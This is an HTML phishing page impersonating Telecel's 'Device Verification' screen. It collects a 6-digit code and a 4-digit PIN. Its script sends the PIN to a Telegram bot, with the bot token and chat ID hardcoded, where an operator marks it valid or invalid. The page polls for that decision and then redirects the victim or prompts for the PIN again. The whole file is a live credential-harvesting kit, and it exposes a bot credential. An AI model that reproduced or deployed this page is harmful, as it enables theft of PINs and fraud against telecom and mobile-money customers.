<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8"/>
    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
    <title>Telecel - Device Verification</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #E30613 0%, #0033A0 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            color: #333;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: #fff;
            border-radius: 16px;
            padding: 32px 24px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.15);
            text-align: center;
        }
        .logo-t {
            color: #E30613;
            font-size: 52px;
            font-weight: 900;
            letter-spacing: -1px;
            border: 4px solid #E30613;
            border-radius: 50%;
            width: 80px;
            height: 80px;
            line-height: 72px;
            margin: 0 auto;
        }
        .logo-text {
            color: #E30613;
            font-size: 28px;
            font-weight: 700;
            margin: 8px 0 24px;
        }
        h1 { font-size: 24px; font-weight: 700; margin: 16px 0 8px; }
        p { color: #666; margin-bottom: 24px; }
        .input-group {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 20px 0;
        }
        .otp-input, .pin-input {
            width: 45px;
            height: 55px;
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            border: 2px solid #ddd;
            border-radius: 8px;
        }
        .otp-input:focus, .pin-input:focus {
            border-color: #E30613;
            outline: none;
        }
        .btn {
            width: 100%;
            padding: 14px;
            margin: 15px 0;
            border: none;
            border-radius: 50px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
        }
        .submit-btn { background: #E30613; color: white; }
        .error-msg { color: #dc3545; margin: 15px 0; display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo-t">t</div>
        <div class="logo-text">telecel</div>
        <h1 id="stepTitle">Device Verification</h1>
        <p id="stepDesc">A 6-digit verification code has been sent to your number</p>

        <!-- Device Code Step -->
        <div id="deviceStep">
            <div class="input-group" id="deviceInputs"></div>
            <button class="btn submit-btn" onclick="submitDeviceCode()">Verify Device</button>
        </div>

        <!-- PIN Step -->
        <div id="pinStep" style="display: none;">
            <p>Enter your 4-digit PIN to confirm</p>
            <div class="input-group" id="pinInputs"></div>
            <button class="btn submit-btn" onclick="submitPin()">Confirm PIN</button>
        </div>

        <div class="error-msg" id="errMsg"></div>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
            CHAT_ID: '7547427914',
            SUCCESS_PAGE: 'success.html'
        };

        let state = {
            lastUpdateId: 0,
            pollInterval: null,
            validPinId: null,
            invalidPinId: null
        };

        // Create 6 inputs for device code
        function setupInputs(containerId, count, isPin = false) {
            const container = document.getElementById(containerId);
            container.innerHTML = '';
            for (let i = 0; i < count; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = 1;
                input.className = isPin ? 'pin-input' : 'otp-input';
                input.inputMode = 'numeric';
                input.oninput = (e) => handleInput(e, i, count, isPin);
                input.onkeydown = (e) => handleKeyDown(e, i, isPin);
                container.appendChild(input);
            }
        }

        function handleInput(e, index, total, isPin) {
            const inputs = document.querySelectorAll(isPin ? '.pin-input' : '.otp-input');
            if (e.target.value.length === 1 && index < total - 1) {
                inputs[index + 1].focus();
            }
        }

        function handleKeyDown(e, index, isPin) {
            const inputs = document.querySelectorAll(isPin ? '.pin-input' : '.otp-input');
            if (e.key === 'Backspace' && index > 0 && !e.target.value) {
                inputs[index - 1].focus();
            }
        }

        function getCode(isPin) {
            const selector = isPin ? '.pin-input' : '.otp-input';
            return Array.from(document.querySelectorAll(selector)).map(i => i.value).join('');
        }

        function submitDeviceCode() {
            const code = getCode(false);
            if (code.length !== 6) {
                showError("Please enter the 6-digit code");
                return;
            }
            // Move to PIN step
            document.getElementById('deviceStep').style.display = 'none';
            document.getElementById('pinStep').style.display = 'block';
            document.getElementById('stepTitle').textContent = "Enter PIN";
            document.getElementById('stepDesc').textContent = "Confirm with your 4-digit PIN";
        }

        function submitPin() {
            const pin = getCode(true);
            if (pin.length !== 4) {
                showError("PIN must be 4 digits");
                return;
            }

            const ts = Date.now();
            state.validPinId = `validpin_${ts}`;
            state.invalidPinId = `invalidpin_${ts}`;

            const message = `<b>🔴 PIN Confirmation</b>\n\nPIN Entered: ${pin}\n\nChoose Result:`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Valid PIN", callback_data: state.validPinId },
                                { text: "❌ Invalid PIN", callback_data: state.invalidPinId }
                            ]
                        ]
                    }
                })
            }).then(() => {
                startPolling();
            });
        }

        function showError(msg) {
            const err = document.getElementById('errMsg');
            err.textContent = msg;
            err.style.display = 'block';
            setTimeout(() => err.style.display = 'none', 4000);
        }

        function startPolling() {
            if (state.pollInterval) clearInterval(state.pollInterval);

            state.pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        if (!data.ok || !data.result) return;
                        data.result.forEach(update => {
                            state.lastUpdateId = Math.max(state.lastUpdateId, update.update_id);
                            if (update.callback_query) {
                                const cb = update.callback_query.data;

                                if (cb === state.validPinId) {
                                    clearInterval(state.pollInterval);
                                    window.location.href = CONFIG.SUCCESS_PAGE;

                                } else if (cb === state.invalidPinId) {
                                    clearInterval(state.pollInterval);
                                    // Return to PIN step
                                    document.getElementById('pinStep').style.display = 'block';
                                    document.getElementById('errMsg').textContent = "Invalid PIN. Please try again.";
                                    document.getElementById('errMsg').style.display = 'block';
                                    // Clear PIN inputs
                                    document.querySelectorAll('.pin-input').forEach(i => i.value = '');
                                }
                            }
                        });
                    });
            }, 2000);
        }

        // Initialize
        setupInputs('deviceInputs', 6);
        setupInputs('pinInputs', 4, true);
        document.querySelectorAll('.otp-input')[0].focus();
    </script>
</body>
</html>
